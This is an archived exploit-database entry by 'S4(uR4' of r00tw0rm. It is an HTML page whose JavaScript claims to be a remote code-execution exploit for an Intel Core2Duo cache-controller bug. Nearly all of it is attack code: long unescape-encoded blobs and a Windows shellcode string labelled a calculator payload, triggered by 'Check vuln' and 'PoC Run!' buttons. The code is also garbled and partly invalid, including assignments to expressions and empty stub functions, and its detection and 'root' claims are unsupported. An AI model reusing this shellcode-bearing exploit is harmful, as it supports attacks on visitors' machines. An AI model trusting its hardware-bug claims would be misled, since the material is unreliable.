@@ -1,0 +1,370 @@
+id: 18984
+date: 07/13/2012
+title: Intel Core2Duo cpu cache controller bug PoC
+author: S4(uR4
+cves: 
+
+<!--
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0                 I'm S4(uR4 member from r00tw0rm team                 1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+'''
+
+#
+# Name      : Intel Core2Duo cpu cache controller Remote Exec Exploit in JavaScript
+# Date      : july, 14 2012
+# Author    : S4(uR4
+# Platform  : all
+# Type      : remote exploit
+# Web       : www.r00tw0rm.com
+# Email     : satsura@r00tw0rm.com
+# Credit and special thanx : Selena, nezumi 
+# Tested on : Intel Core 2 Duo T5750, Intel Atom N270
+# Special thanks to :  r0073r, r4dc0re, Sid3^effects, L0rd CrusAd3r, KedAns-Dz, Angel Injection, gunslinger, JF, CrosS (1337day.com)
+#                      Xenu, Versus71, alsa7r, mich4th3c0wb0y, FInnH@X, th3breacher, s3rver.exe (r00tw0rm.com)
+
+-->
+
+<html>
+	<head>
+		<title> CPU cache controller bug exploit (Remote code exec mod poc)</title>
+	</head>
+</html>
+
+<body>
+<script type="text/javascript">
+
+var microcode = 257;
+var N_CORE = 4;
+var XXL = 9*1024*1024;
+var buf = 9437185;
+
+var p = {};
+var bug;
+var result;
+var n = {};
+function init_c(){};
+function engine(p, n){};
+
+function test(result){
+// debug: testing micro-program for the old vm, does not work now 
+// latter comment 1: oh. my! it works! wow!
+// latter comment 2: it works, but it does not what it's expected to
+// dw buf[]={1,-3,0, -6,9,1, 13,-67,2, -69,96,3, 1,-1,4,
+// -3,3,5, 16,-27,6, -66,99,7, 55,-1,8, -1,-3,9, 0,-67,10};
+
+
+// the infinite loop will be patched on the fly because of the Intel CPU bug
+// addr of the test() func should be aligned by 4Kb boundary,
+// 1st dword will be changed to NOP, NOP, NOP, NOP
+// it's possible to change the kernel memory as well,
+// two things:
+// 1) alignment;
+// 2) the code is currently executed;
+//
+// engine() obtains the address of test(), but does not check it,
+// so if you replace it, you have to check the conditionals above by yourself.
+// also the content to overwrite. if you want to change data memory
+// it's supposed to be in the cache as well.
+/*
+
+ASM:
+        .text
+.globl main
+        .type   main, @function
+L1:
+        xorl %ecx, %ecx
+
+main:
+        pushl   %ebp
+        movl    %esp, %ebp
+        popl    %ebp
+        loop L1
+        ret
+        .size   main, .-main
+
+DISASM:
+
+080483b4 <L1>:
+80483b4:	31 c9                	xor    %ecx,%ecx
+
+080483b6 <main>:
+80483b6:	55                   	push   %ebp
+80483b7:	89 e5                	mov    %esp,%ebp
+80483b9:	5d                   	pop    %ebp
+80483ba:	e2 f8                	loop   80483b4 <L1>
+80483bc:	c3                   	ret    
+80483bd:	90                   	nop
+80483be:	90                   	nop
+80483bf:	90                   	nop
+
+*/
+	unescape('%u31C9%u5589%uE55D%u2EF8%uC390%u9090');
+	return 0;
+}
+
+
+
+function ThreadProc(lpParameter){
+	engine(buf, microcode*3);
+	return(0);
+}
+
+
+function ThreadProc_dbg(bug){
+	var result = 1;
+	test(result);
+	if (result != 1){
+		document.write("<h1>[+] your CPU is buggy!<h1>");
+    }
+	else{
+		document.write("<h1>[-] your CPU isn't buggy!<h1>");
+		//eueeuereturn(0);
+	}
+}
+
+
+function microcode_vm(){
+	var evilcode = "6B70%u6E63%u2066%u6F72%u204A%u442E%u2066%u6F72%u2049%u6E74"+
+	"%u656C%u2043%u6F72%u6520%u3220%u4475%u6F20%u5435%u3735%u300D%u0A28%u6329"+
+	"%u2053%u656C%u656E%u612F%u2F32%u3030%u372C%u2032%u3030%u3800%u2B00%u0000"+
+	"%u0500%u0000%u2600%u0000%u3E00%u0000%u4702%u0000%uE7FD%uFFFF%u0000%u0000"+
+	"%uA3FF%uFFFF%uA7FF%uFFFF%u0100%u0000%u0200%u0000%u0A00%u0000%u0200%u0000"+
+	"%u0100%u0000%u0900%u0000%u0300%u0000%u0400%u0000%u1400%u0000%u0400%u0000"+
+	"%u1F00%u0000%u2B00%u0000%u0500%u0000%u2600%u0000%u3E00%u0000%u0600%u0000"+
+	"%u0D00%u0000%u2500%u0000%u0700%u0000%u3000%u0000%u4000%u0000%u0800%u0000"+
+	"%u6B00%u0000%u8F00%u0000%u0900%u0000%uFA00%u0000%u1201%u0000%u0A00%u0000"+
+	"%uC901%u0000%uE101%u0000%u0B00%u0000%u0C00%u0000%u3C00%u0000%u0C00%u0000"+
+	"%u1700%u0000%u3300%u0000%u0D00%u0000%u0E00%u0000%u3600%u0000%u0E00%u0000"+
+	"%u1500%u0000%u4D00%u0000%u0F00%u0000%u6800%u0000%u8800%u0000%u1000%u0000"+
+	"%uD300%u0000%u1701%u0000%u1100%u0000%uF201%u0000%u3A02%u0000%u1200%u0000"+
+	"%uF103%u0000%u3904%u0000%u1300%u0000%uF407%u0000%u2408%u0000%u1400%u0000"+
+	"%uEF0F%u0000%u3B10%u0000%u1500%u0000%u961F%u0000%uCE1F%u0000%u1600%u0000"+
+	"%u1D00%u0000%u7500%u0000%u1700%u0000%u2000%u0000%u7000%u0000%u1800%u0000"+
+	"%u1B00%u0000%u7F00%u0000%u1900%u0000%u2A00%u0000%u6200%u0000%u1A00%u0000"+
+	"%u1900%u0000%u7100%u0000%u1B00%u0000%u3C00%u0000%u8C00%u0000%u1C00%u0000"+
+	"%uE700%u0000%u2301%u0000%u1D00%u0000%u9E01%u0000%uE601%u0000%u1E00%u0000"+
+	"%u2500%u0000%u9D00%u0000%u1F00%u0000%uD800%u0000%u1801%u0000%u2000%u0000"+
+	"%uA301%u0000%u2702%u0000%u2100%u0000%uE203%u0000%u6A04%u0000%u2200%u0000"+
+	"%uE107%u0000%u6908%u0000%u2300%u0000%uE40F%u0000%u7410%u0000%u2400%u0000"+
+	"%uFF1F%u0000%u4B20%u0000%u2500%u0000%uC63F%u0000%u1E40%u0000%u2600%u0000"+
+	"%uAD7F%u0000%u0580%u0000%u2700%u0000%uD0FF%u0000%u6000%u0100%u2800%u0000"+
+	"%uCBFF%u0100%u6F00%u0200%u2900%u0000%uDAFF%u0300%u7200%u0400%u2A00%u0000"+
+	"%u29FF%u0700%u81FF%u0700%u2B00%u0000%u2C00%u0000%u9C00%u0000%u2C00%u0000"+
+	"%u3700%u0000%u9300%u0000%u2D00%u0000%u2E00%u0000%u9600%u0000%u2E00%u0000"+
+	"%u3500%u0000%uED00%u0000%u2F00%u0000%u4800%u0000%uE800%u0000%u3000%u0000"+
+	"%u3300%u0000%uF700%u0000%u3100%u0000%u5200%u0000%uDA00%u0000%u3200%u0000"+
+	"%u1100%u0000%u9900%u0000%u3300%u0000%u1400%u0000%u8400%u0000%u3400%u0000"+
+	"%u0F00%u0000%u9B00%u0000%u3500%u0000%u3600%u0000%uEE00%u0000%u3600%u0000"+
+	"%u7D00%u0000%u1501%u0000%u3700%u0000%uC001%u0000%u5002%u0000%u3800%u0000"+
+	"%u3B03%u0000%uDF03%u0000%u3900%u0000%u4A00%u0000%uC200%u0000%u3A00%u0000"+
+	"%u3900%u0000%uD100%u0000%u3B00%u0000%u5C00%u0000%u2C01%u0000%u3C00%u0000"+
+	"%uC701%u0000%u4302%u0000%u3D00%u0000%u3E03%u0000%uC603%u0000%u3E00%u0000"+
+	"%u4500%u0000%u3D01%u0000%u3F00%u0000%uB801%u0000%u3802%u0000%u4000%u0000"+
+	"%u4303%u0000%u4704%u0000%u4100%u0000%uC207%u0000%uCA08%u0000%u4200%u0000"+
+	"%uC10F%u0000%uC910%u0000%u4300%u0000%uC41F%u0000%uD420%u0000%u4400%u0000"+
+	"%uDF3F%u0000%uEB40%u0000%u4500%u0000%uE67F%u0000%uFE80%u0000%u4600%u0000"+
+	"%uCDFF%u0000%uE500%u0100%u4700%u0000%uF0FF%u0100%u8000%u0200%u4800%u0000"+
+	"%uABFF%u0300%uCF00%u0400%u4900%u0000%uBAFF%u0700%uD200%u0800%u4A00%u0000"+
+	"%u89FF%u0F00%u2100%u1000%u4B00%u0000%u4CFF%u1F00%u7C00%u2000%u4C00%u0000"+
+	"%uD7FF%u3F00%uF300%u4000%u4D00%u0000%uCEFF%u7F00%uF600%u8000%u4E00%u0000"+
+	"%uD5FF%uFF00%u8D00%u0001%u4F00%u0000%uA8FF%uFF01%uC800%u0002%u5000%u0000"+
+	"%u93FF%uFF03%uD700%u0004%u5100%u0000%uB2FF%uFF07%uFA00%u0008%u5200%u0000"+
+	"%uB1FF%uFF0F%uF900%u0010%u5300%u0000%uB4FF%uFF1F%uE400%u0020%u5400%u0000"+
+	"%uAFFF%uFF3F%uFB00%u0040%u5500%u0000%u56FE%uFF7F%u0EFF%uFF7F%u5600%u0000"+
+	"%u5D00%u0000%u3501%u0000%u5700%u0000%u6000%u0000%u3001%u0000%u5800%u0000"+
+	"%u5B00%u0000%u3F01%u0000%u5900%u0000%u6A00%u0000%u2201%u0000%u5A00%u0000"+
+	"%u5900%u0000%u3101%u0000%u5B00%u0000%u7C00%u0000%uCC01%u0000%u5C00%u0000"+
+	"%uA700%u0000%uE301%u0000%u5D00%u0000%u5E00%u0000%u2601%u0000%u5E00%u0000"+
+	"%u6500%u0000%uDD01%u0000%u5F00%u0000%u9800%u0000%uD801%u0000%u6000%u0000"+
+	"%u6300%u0000%uE701%u0000%u6100%u0000%uA200%u0000%uAA01%u0000%u6200%u0000"+
+	"%u2100%u0000%u2901%u0000%u6300%u0000%u2400%u0000%u3401%u0000%u6400%u0000"+
+	"%u3F00%u0000%u0B01%u0000%u6500%u0000%u0600%u0000%u5E01%u0000%u6600%u0000"+
+	"%u6D00%u0000%uC501%u0000%u6700%u0000%u9000%u0000%uA001%u0000%u6800%u0000"+
+	"%u0B00%u0000%u2F01%u0000%u6900%u0000%u1A00%u0000%u3201%u0000%u6A00%u0000"+
+	"%u6900%u0000%uC101%u0000%u6B00%u0000%uEC00%u0000%u5C02%u0000%u6C00%u0000"+
+	"%uF703%u0000%u5305%u0000%u6D00%u0000%uEE07%u0000%u5609%u0000%u6E00%u0000"+
+	"%uF50F%u0000%u2D11%u0000%u6F00%u0000%u881F%u0000%uA820%u0000%u7000%u0000"+
+	"%u733E%u0000%uB73F%u0000%u7100%u0000%u9200%u0000%u9A01%u0000%u7200%u0000"+
+	"%u5100%u0000%uD901%u0000%u7300%u0000%uD400%u0000%u4402%u0000%u7400%u0000"+
+	"%uCF03%u0000%u5B05%u0000%u7500%u0000%uF607%u0000%u2E09%u0000%u7600%u0000"+
+	"%uBD0F%u0000%u5511%u0000%u7700%u0000%u801F%u0000%u9020%u0000%u7800%u0000"+
+	"%u7B3E%u0000%u9F3F%u0000%u7900%u0000%u8A00%u0000%u8201%u0000%u7A00%u0000"+
+	"%u7900%u0000%u9101%u0000%u7B00%u0000%u9C00%u0000%u6C02%u0000%u7C00%u0000"+
+	"%u8703%u0000%u8304%u0000%u7D00%u0000%u7E06%u0000%u8607%u0000%u7E00%u0000"+
+	"%u8500%u0000%u7D02%u0000%u7F00%u0000%u7803%u0000%u7804%u0000%u8000%u0000"+
+	"%u8306%u0000%u8708%u0000%u8100%u0000%u820F%u0000%u8A11%u0000%u8200%u0000"+
+	"%u811F%u0000%u8921%u0000%u8300%u0000%u843F%u0000%u9441%u0000%u8400%u0000"+
+	"%u9F7F%u0000%uAB81%u0000%u8500%u0000%uA6FF%u0000%uBE01%u0100%u8600%u0000"+
+	"%u8DFF%u0100%uA501%u0200%u8700%u0000%uB0FF%u0300%uC001%u0400%u8800%u0000"+
+	"%uEBFF%u0700%u0F01%u0800%u8900%u0000%u7AFF%u0F00%u9201%u1000%u8A00%u0000"+
+	"%u49FF%u1F00%u6100%u2000%u8B00%u0000%u8CFE%u3F00%uBC00%u4000%u8C00%u0000"+
+	"%u97FF%u7F00%uB301%u8000%u8D00%u0000%u8EFF%uFF00%uB601%u0001%u8E00%u0000"+
+	"%u95FF%uFF01%uCD01%u0002%u8F00%u0000%uE8FF%uFF03%u0801%u0004%u9000%u0000"+
+	"%u53FF%uFF07%u9701%u0008%u9100%u0000%u72FF%uFF0F%uBA01%u0010%u9200%u0000"+
+	"%u71FF%uFF1F%uB901%u0020%u9300%u0000%u74FF%uFF3F%uA401%u0040%u9400%u0000"+
+	"%u6FFF%uFF7F%uBB01%u0080%u9500%u0000%u16FF%uFFFF%u4E00%u0000%u9600%u0000"+
+	"%u9DFE%uFFFF%uF500%u0000%u9700%u0000%uA0FF%uFFFF%uF001%u0000%u9800%u0000"+
+	"%u9BFF%uFFFF%uFF01%u0000%u9900%u0000%uAAFF%uFFFF%uE201%u0000%u9A00%u0000"+
+	"%u99FF%uFFFF%uF101%u0000%u9B00%u0000%uBCFF%uFFFF%u0C01%u0000%u9C00%u0000"+
+	"%u67FF%uFFFF%uA301%u0000%u9D00%u0000%u1EFF%uFFFF%u6600%u0000%u9E00%u0000"+
+	"%uA5FE%uFFFF%u1D00%u0000%u9F00%u0000%u58FF%uFFFF%u9801%u0000%uA000%u0000"+
+	"%u23FF%uFFFF%uA701%u0000%uA100%u0000%u62FF%uFFFF%uEA01%u0000%uA200%u0000"+
+	"%u61FF%uFFFF%uE901%u0000%uA300%u0000%u64FF%uFFFF%uF401%u0000%uA400%u0000"+
+	"%u7FFF%uFFFF%uCB01%u0000%uA500%u0000%u46FF%uFFFF%u9E01%u0000%uA600%u0000"+
+	"%u2DFF%uFFFF%u8501%u0000%uA700%u0000%u50FF%uFFFF%uE001%u0000%uA800%u0000"+
+	"%u4BFF%uFFFF%uEF01%u0000%uA900%u0000%u5AFF%uFFFF%uF201%u0000%uAA00%u0000"+
+	"%uA9FC%uFFFF%u01FE%uFFFF%uAB00%u0000%uAC00%u0000%u1C02%u0000%uAC00%u0000"+
+	"%uB700%u0000%u1302%u0000%uAD00%u0000%uAE00%u0000%u1602%u0000%uAE00%u0000"+
+	"%uB500%u0000%u6D02%u0000%uAF00%u0000%uC800%u0000%u6802%u0000%uB000%u0000"+
+	"%uB300%u0000%u7702%u0000%uB100%u0000%uD200%u0000%u5A02%u0000%uB200%u0000"+
+	"%u9100%u0000%u1902%u0000%uB300%u0000%u9400%u0000%u0402%u0000%uB400%u0000"+
+	"%u8F00%u0000%u1B02%u0000%uB500%u0000%uB600%u0000%u6E02%u0000%uB600%u0000"+
+	"%uFD00%u0000%u9503%u0000%uB700%u0000%u4001%u0000%uD003%u0000%uB800%u0000"+
+	"%uBB00%u0000%u5F02%u0000%uB900%u0000%uCA00%u0000%u4202%u0000%uBA00%u0000"+
+	"%uB900%u0000%u5102%u0000%uBB00%u0000%uDC00%u0000%uAC03%u0000%uBC00%u0000"+
+	"%u4701%u0000%uC303%u0000%uBD00%u0000%uBE00%u0000%u4602%u0000%uBE00%u0000"+
+	"%uC500%u0000%uBD03%u0000%uBF00%u0000%u3801%u0000%uB803%u0000%uC000%u0000"+
+	"%uC300%u0000%uC703%u0000%uC100%u0000%u4201%u0000%u4A03%u0000%uC200%u0000"+
+	"%u4100%u0000%u4902%u0000%uC300%u0000%u4400%u0000%u5402%u0000%uC400%u0000"+
+	"%u5F00%u0000%u6B02%u0000%uC500%u0000%u6600%u0000%u7E02%u0000%uC600%u0000"+
+	"%u4D00%u0000%u6502%u0000%uC700%u0000%u7000%u0000%u0002%u0000%uC800%u0000"+
+	"%u2B00%u0000%u4F02%u0000%uC900%u0000%u3A00%u0000%u5202%u0000%uCA00%u0000"+
+	"%u0900%u0000%uA102%u0000%uCB00%u0000%uCC00%u0000%uFC03%u0000%uCC00%u0000"+
+	"%u5701%u0000%u7303%u0000%uCD00%u0000%u4E00%u0000%u7602%u0000%uCE00%u0000"+
+	"%u5500%u0000%u0D02%u0000%uCF00%u0000%u2800%u0000%u4802%u0000%uD000%u0000"+
+	"%u1300%u0000%u5702%u0000%uD100%u0000%u3200%u0000%u7A02%u0000%uD200%u0000"+
+	"%u3100%u0000%u7902%u0000%uD300%u0000%u3400%u0000%u6402%u0000%uD400%u0000"+
+	"%u2F00%u0000%u7B02%u0000%uD500%u0000%uD600%u0000%u8E03%u0000%uD600%u0000"+
+	"%uDD01%u0000%uB504%u0000%uD700%u0000%uE007%u0000%uB00A%u0000%uD800%u0000"+
+	"%uDB0F%u0000%uBF12%u0000%uD900%u0000%uEA1F%u0000%uA222%u0000%uDA00%u0000"+
+	"%uD93F%u0000%uB142%u0000%uDB00%u0000%uFC7F%u0000%u4C82%u0000%uDC00%u0000"+
+	"%u27FF%u0000%u6301%u0100%uDD00%u0000%uDEFC%u0100%uA6FF%u0100%uDE00%u0000"+
+	"%uE501%u0000%u5D04%u0000%uDF00%u0000%u1807%u0000%u5809%u0000%uE000%u0000"+
+	"%uE30C%u0000%u670F%u0000%uE100%u0000%u2201%u0000%u2A03%u0000%uE200%u0000"+
+	"%uA100%u0000%uA903%u0000%uE300%u0000%uA401%u0000%uB404%u0000%uE400%u0000"+
+	"%uBF07%u0000%u8B0A%u0000%uE500%u0000%u860F%u0000%uDE12%u0000%uE600%u0000"+
+	"%uED1F%u0000%u4522%u0000%uE700%u0000%u103F%u0000%u2041%u0000%uE800%u0000"+
+	"%u8B7C%u0000%uAF7F%u0000%uE900%u0000%u9A01%u0000%uB204%u0000%uEA00%u0000"+
+	"%uE907%u0000%u410A%u0000%uEB00%u0000%u6C0F%u0000%uDC12%u0000%uEC00%u0000"+
+	"%u771F%u0000%uD322%u0000%uED00%u0000%u6E3F%u0000%uD642%u0000%uEE00%u0000"+
+	"%u757F%u0000%uAD82%u0000%uEF00%u0000%u08FF%u0000%u2801%u0100%uF000%u0000"+
+	"%uF3FC%u0100%u37FF%u0100%uF100%u0000%u1201%u0000%u1A03%u0000%uF200%u0000"+
+	"%uD100%u0000%u5903%u0000%uF300%u0000%u5401%u0000%uC404%u0000%uF400%u0000"+
+	"%u4F07%u0000%uDB0A%u0000%uF500%u0000%u760F%u0000%uAE12%u0000%uF600%u0000"+
+	"%u3D1F%u0000%uD522%u0000%uF700%u0000%u003F%u0000%u1041%u0000%uF800%u0000"+
+	"%uFB7C%u0000%u1F7F%u0000%uF900%u0000%u0A01%u0000%u0203%u0000%uFA00%u0000"+
+	"%uF900%u0000%u1103%u0000%uFB00%u0000%u1C01%u0000%uEC04%u0000%uFC00%u0000"+
+	"%u0707%u0000%u0309%u0000%uFD00%u0000%uFE0C%u0000%u060F%u0000%uFE00%u0000"+
+	"%u0501%u0000%uFD04%u0000%uFF00%u0000%uF806%u0000%uF808%u0000%u0001%u0000";
+	unescape(evilcode);
+}
+
+/*
+// THREATED IMPLEMENTATION
+function init(){
+	document.write("<p>[!] Exploit Running</p><br>");
+	document.write("[+] Loading micro-program");
+	microcode_vm();
+	var a, id, handle;
+	var size = 111;
+	document.write("initializing XX thread...");
+	
+	for (a=1; a < N_CORE; a++){
+			//code should be written for debug.
+	}
+
+}
+
+*/
+
+function vm_engine()
+{
+	var a, dw, f1, f2, f3, fn, f0 = -1, dt = 0;
+	for(;;){
+		microcode_vm();
+		f1;
+		unescape = (p + ((dt++) % n));
+		f2 = (p + ((dt++) % n));
+		f3 = (p + ((dt++) % n));
+
+		// vm + scrambler + dynamic encoder + multi-pass obfuscator
+		fn = -1 ^ (f1 ^ f2) + ((dt + f1) ^ f2) ^ f0;
+
+		// a few minutes to trigger this condition on 2.4 MHz PC
+		if ( ((f1 ^ f2) == 0) || (f1 ^ f2 ^ f3) == 0)
+		{
+			// a sync problem. it would be better to use locks over here.
+			// crash happens. crash is not shit. crash means code works.
+			// so, should be really care about the addr and the content?
+			// it works for Intel Core 2 Duo T5750. o_o 5 ~ 10 minutes of
+			// it gives BSOD on Intel Atom N270 cpu o_o less than an hour
+			f3 = test(result); f1 = unescape("%u9090%u9090") ^ f0 + 
+			// Shellcode Calculator 
+			unescape("%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800"+   
+                     "%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A" +   
+                     "%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350" +   
+                     "%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40" +   
+                     "%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000" +   
+                     "%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040" +   
+                     "%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD" +   
+                     "%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40" +   
+                     "%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18" +   
+                     "%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0" +   
+                     "%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B" +   
+                     "%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24" +   
+                     "%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9" +   
+                     "%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C" +   
+                     "%u652E%u6578%u9000"); f2 = test ^ fn;
+
+			document.write("<br><br>w00t! w00t! u g0t r00t ?!<br>");
+		}	(p + (f3 % n)) = fn; f0 = fn; /* f0 = fn ^ dt */ ;
+	}
+}
+
+function demo()
+{
+	var n;
+	document.write("HITB 2008 missing exploit :=) by Selena<br><br>");
+	document.write("micro-code is written by Selena<br>");
+	document.write("virtual machine is designed by Selena<br>");
+	document.write("virtual machine is designed by Selena<br>");
+	document.write("virtual machine has been rewritten by nezumi<br><br>");
+	document.write("exploit PoC rewritten by S4(uR4 for remote atack demo 2012<br><br>");
+	//setTimeout(9000);
+	document.write("[!]<b> Exploit Running");
+	vm_engine(); //if (n == 0) { init_t();} ;
+	//if(result != 0){
+		document.write("<br><b>[+] Done!");
+	//}
+}
+
+
+
+</script>
+<h1>CPU cache controller bug exploit Remote code exec mod</h1>
+
+<button onClick="ThreadProc_dbg(bug)";><b>&bull; Check vuln</b> &raquo;</button> 
+<button onClick="demo()";><b>PoC Run!</b> &rarr;</button>
+
+
+</body>
+
+
+
+#  0day.today [2023-03-22]  #
